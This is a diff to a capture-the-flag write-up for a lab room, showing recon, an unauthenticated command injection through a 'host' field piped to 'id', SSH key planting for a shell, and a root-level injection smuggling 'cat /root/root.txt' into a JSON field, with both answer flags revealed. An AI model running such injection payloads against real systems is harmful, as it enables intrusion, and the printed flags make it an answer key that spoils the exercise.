@@ -1,7 +1,5 @@
 **Room 11 (Infinity Pool) = OS command injection - RCE - FreePBX**
 
-
-
 1. `nmap` scan shows 2 open ports: `port 22` (SSH) and `port 80` (HTTP), `gunicorn` header means it's a `Python/Flask` app
 2. `robots.txt` leaks `/internal/` and `/status`
 • `/static/app.js` has a dev comment: staff netcheck tool at /status posts to /internal/netcheck, "legacy handler, no auth gateway yet" -> unauthenticated
@@ -9,6 +7,14 @@
 • ";" is filtered, but | $() backticks and newline all get through
 4. confirm RCE as web: `curl -s -X POST http://IP/internal/netcheck --data-urlencode 'host=127.0.0.1 | id'`
 5. \_{user flag}\_ -> current user is "web", so `cat /home/web/user.txt`
+
+<details>
+  <summary>Reveal the 1st flag</summary>
+
+  **_THM{n0_v1s1bl3_3dg3}_**
+
+</details>
+
 6. `/home/web/.ssh/` is writable -> plant a key for a real shell + forward the loopback services:
 ```
 ssh-keygen -t ed25519 -f \~/.ssh/bytelotus -N ""
@@ -28,13 +34,15 @@ ssh -i \~/.ssh/bytelotus -L 8080:127.0.0.1:8080 -L 3000:127.0.0.1:3000 -L 9000:1
 curl -s -X POST http://127.0.0.1:9000/jobs/export \\
   -H "Authorization: Bearer cc\_auto\_7b3f9a1c4e0d2f6a" \\
   -H "Content-Type: application/json" \\
-  --data '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}' -> \_{root flag}\_
+  --data '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
+```
+  -> \_{root flag}\_
 
-&#x20;  ```
+<details>
+  <summary>Reveal the 2nd flag</summary>
 
+  **_THM{tr4c3d_t0_th3_h0r1z0n}_**
 
+</details>
 
 `nmap scan -> robots.txt helps with OS command injection -> RCE -> 1st flag -> SSH keygen -> internal recon reveals FreePBX creds -> add Voicemail widget to /dashboard -> use Automation Key to login as root -> 2nd flag`
-
-
-
